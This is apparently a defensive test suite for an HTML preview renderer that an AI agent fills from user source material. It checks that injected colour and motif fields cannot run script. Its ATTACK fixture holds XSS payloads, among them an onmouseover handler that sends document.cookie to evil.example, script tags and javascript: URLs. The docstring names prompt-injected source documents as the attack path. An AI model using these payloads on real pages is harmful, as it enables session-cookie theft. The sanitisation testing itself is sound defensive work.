#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The direction-gate preview is a page the USER opens. Untrusted input must not reach it live.

WHY. `archetypes_html.py` renders `directions.json` into an HTML file the user opens in their own
browser, and the agent writes that JSON while reading the user's SOURCE MATERIAL — a paper, a
deck, a repo, a web page, any of which can carry instructions aimed at a language model. Text
fields already went through `html.escape`. COLOURS did not, and they are interpolated into
`style="…"` attributes in ~86 places, so

    "accent": "#fff\\" onmouseover=\\"fetch('http://evil/'+document.cookie)"

closed the attribute and attached an event handler to elements across the page. Fixed at `_norm`,
the one function every direction passes through — patching 86 f-strings would have left the 87th.

`cover_motif` / `ambient_motif` stay RAW HTML on purpose: a bespoke register draws its own
signature, and the 5.0.0 direction-gate structure check requires at most one motif-less colourway,
so escaping them would delete the capability the gate demands. They are SANITISED instead —
executable markup out, shape and colour in. Most of this suite is that boundary, because a
sanitiser that also eats the `<svg>` is a sanitiser nobody will keep.

Run:  python3 tests/test_preview_injection.py
"""
import json
import pathlib
import subprocess
import sys
import tempfile

HERE = pathlib.Path(__file__).resolve().parent
SKILL = HERE.parent
sys.path.insert(0, str(SKILL / "scripts"))

import archetypes_html as ah  # noqa: E402

PASS = FAIL = 0


def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ok   {name}")
    else:
        FAIL += 1
        print(f"  FAIL {name}  {detail}")


ATTACK = {
    "name": "Attack",
    "accent": "#fff\" onmouseover=\"fetch('http://evil.example/'+document.cookie)",
    "ink": "#111\"><script>alert(1)</script><span style=\"color:#111",
    "bg": "#FFFFFF",
    "mute": "javascript:alert(9)",
    "font_body": "Arial\"></style><script>alert(2)</script><style>",
    "cover_motif": ("<svg viewBox='0 0 10 10'><circle cx='5' cy='5' r='4' fill='#B0451F'/></svg>"
                    "<script>fetch('http://evil.example/x')</script>"
                    "<div onclick=\"steal()\" style='background:#eee'>x</div>"),
    "ambient_motif": "<a href=\"javascript:alert(4)\">go</a><div style='background:#eee'>ok</div>",
}
CLEAN = {"name": "Clean", "accent": "#2C6B76", "ink": "#1A1A1A", "bg": "#FCFAF5",
         "cover_motif": "<svg viewBox='0 0 10 10'><rect width='10' height='10' fill='#2C6B76'/></svg>"}


def render(dirs):
    with tempfile.TemporaryDirectory() as td:
        d = pathlib.Path(td)
        (d / "dirs.json").write_text(json.dumps(dirs), encoding="utf-8")
        r = subprocess.run([sys.executable, str(SKILL / "scripts" / "archetypes_html.py"),
                            str(d / "dirs.json"), str(d / "out.html"), "T"],
                           capture_output=True, text=True)
        return (d / "out.html").read_text(encoding="utf-8"), r.stderr


def main():
    html_out, err = render([ATTACK, CLEAN])

    print("== nothing attacker-supplied is live in the rendered page ==")
    for needle, why in (("evil.example", "the exfiltration host"),
                        ("document.cookie", "the payload"),
                        ("onmouseover", "an attribute-breakout handler"),
                        ("steal(", "a handler inside the raw-HTML motif"),
                        ("javascript:", "a script URL")):
        check(f"{needle!r} does not appear ({why})", needle not in html_out)
    # The page's own picker script is legitimate and must survive; what must not survive is an
    # attacker-authored one. Assert the difference rather than "no <script> anywhere".
    check("the page keeps its own picker script", "function pick(" in html_out
          or "onclick=\"pick(" in html_out)

    print("\n== a bespoke register's motif keeps its SHAPE ==")
    check("the attack direction's <svg> survives sanitising", "<circle" in html_out)
    check("the clean direction's <svg> survives", "<rect" in html_out)
    check("an inline style inside a motif survives", "background:#eee" in html_out)

    print("\n== the substitution is LOUD, never silent ==")
    for field in ("accent", "ink", "font_body", "cover_motif"):
        check(f"stderr names the replaced {field}", field in err)

    print("\n== legitimate colour notations are NOT rejected ==")
    ok_dirs = [{"name": f"C{i}", "accent": v, "ink": "#111", "bg": "#fff"}
               for i, v in enumerate(("#abc", "#AABBCC", "#AABBCCDD",
                                      "rgb(12, 34, 56)", "rgba(12,34,56,0.5)",
                                      "hsl(200, 50%, 40%)", "rebeccapurple"))]
    _, err_ok = render(ok_dirs)
    check("hex/rgb/rgba/hsl/keyword all pass untouched", "unsafe value" not in err_ok, err_ok[:160])

    print("\n== sanitize_motif, directly ==")
    cases = [
        ("<svg><circle r='2'/></svg>", "<circle", True, "shape kept"),
        ("<script>x()</script>", "x()", False, "script BODY removed with the element"),
        ("<div onerror='y()'>a</div>", "onerror", False, "handler stripped"),
        ("<a href='javascript:z()'>l</a>", "javascript:", False, "script URL neutralised"),
        ("<div style='color:#f00'>a</div>", "color:#f00", True, "inline style kept"),
        ("<IFRAME SRC=x></IFRAME>", "iframe", False, "case-insensitive"),
        ("<div\nonclick='q()'>a</div>", "onclick", False, "handler across a newline"),
    ]
    for frag, needle, want_present, why in cases:
        out = ah.sanitize_motif(frag)
        present = needle.lower() in out.lower()
        check(f"{why}", present == want_present, repr(out)[:80])
    check("None passes through", ah.sanitize_motif(None) is None)

    print(f"\n{PASS} passed, {FAIL} failed")
    return 1 if FAIL else 0


if __name__ == "__main__":
    raise SystemExit(main())
